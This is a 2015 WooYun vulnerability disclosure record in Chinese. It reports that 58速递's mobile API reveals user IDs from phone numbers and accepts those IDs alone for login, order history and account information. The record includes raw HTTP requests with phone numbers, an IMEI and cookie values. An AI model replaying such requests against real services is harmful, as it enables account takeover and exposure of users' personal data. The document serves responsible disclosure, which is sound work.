{"id": 66069, "wybug_id": "wooyun-2015-0138752", "wybug_title": "58速递某设计缺陷导致用户任意登陆(注册及未注册用户/任意用户订单/账号信息泄漏)", "wybug_corp": "58同城", "wybug_author": "BMa", "wybug_date": "2015-09-03 11:10", "wybug_open_date": "2015-10-19 01:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-19：\t细节向公众公开  简要描述： 58速递某设计缺陷导致用户任意登陆<注册及未注册用户>/任意用户订单/账号信息泄漏一早起来看到司马同学在某漏洞下的评论，让我压力山大，这不赶紧挖个洞压压惊，再去看打鬼子 详细说明：  先来看某处缺陷，再看会造成哪些影响首先在某处会通过用户手机号码即username返回用户的username及userid，username及userid会用在用户登录，用户账号信息／订单信息查看\nGET /api/guest/mobile/bind?type=5&uid=&mobile=13184390431&r=0.2850908009537293&cityid=&realcityid= HTTP/1.1Connection: closecookie: nulli: 1c: 3cce331aa4ac07fe2e0b5200cedc24cdimei: 864587025424723version: 3.3Host: suyun.58.comUser-Agent: 58suyunandroid3.3Cookie: id58=05dz8VXnikeFsjGnJPBfAg==Cookie2: $Version=1Accept-Encoding: gzip,deflatemobile_version: 4.3mobile_board: A0001\n\n\n\n\n查看任意用户的订单记录：\nPOST /api/guest/order/list HTTP/1.1cookie: nullversion: 3.3imei: 864587025424723i: 1c: 2a45cfd2657535aed158fecdbf3107d2Content-Length: 102Content-Type: application/x-www-form-urlencodedHost: suyun.58.comConnection: Keep-AliveUser-Agent: 58suyunandroid3.3Cookie: id58=05dz8VXnikeFsjGnJPBfAg==Cookie2: $Version=1Accept-Encoding: gzip,deflatemobile_version: 4.3mobile_board: A0001uid=628450255477809152&pagesize=10&page=1&mobile=13184390435&r=0.21973828516671368&cityid=&realcityid=\n\n\n\n\n再来看看获取account信息的请求：\nPOST /api/guest/getaccountinfo HTTP/1.1cookie: nullversion: 3.3imei: 864587025424723i: 1c: ece60d48edd9805e9ce08cc28da70aafContent-Length: 81Content-Type: application/x-www-form-urlencodedHost: suyun.58.comConnection: closeUser-Agent: 58suyunandroid3.3Cookie: id58=05dz8VXnikeFsjGnJPBfAg==Cookie2: $Version=1Accept-Encoding: gzip,deflatemobile_version: 4.3mobile_board: A0001uid=633887946189185024&mobile=13184398564&r=0.670826055533804&cityid=&realcityid=\n\n\n最后看看登陆时的请求，看看都返回了些啥\nGET /passport/ps/login.do?rc3CsyJHPpClsXvaxr+i6xIPXPOUcxJgaQaRa8qjD8jEfuo5+bm6yuaA5UUzoBsY HTTP/1.1Connection: closecookie: nullHost: daojia.58.comUser-Agent: 58suyunandroid3.3Cookie: id58=05dz8VXnikeFsjGnJPBfAg==Cookie2: $Version=1Accept-Encoding: gzip,deflatemobile_version: 4.3mobile_board: A0001\n\n\n\n\n没有任何token之类不可伪造的内容，只有userid，而前面已经可以获得所有注册/未注册用户的userid，也就意味着可以登陆任意用户，包括现在的用户以及潜在用户   漏洞证明：     修复方案：     版权声明：转载请注明来源 BMa@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-09-04 01:09 厂商回复： 感谢提交，确认漏洞存在，会尽快修复处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-03 11:15 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1674 漏洞数:267        | ...........................................)\t\t \n  加工资！    \n     2015-09-03 14:50 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1144 漏洞数:112        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  司马!~~你的工资赶上58营业额了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}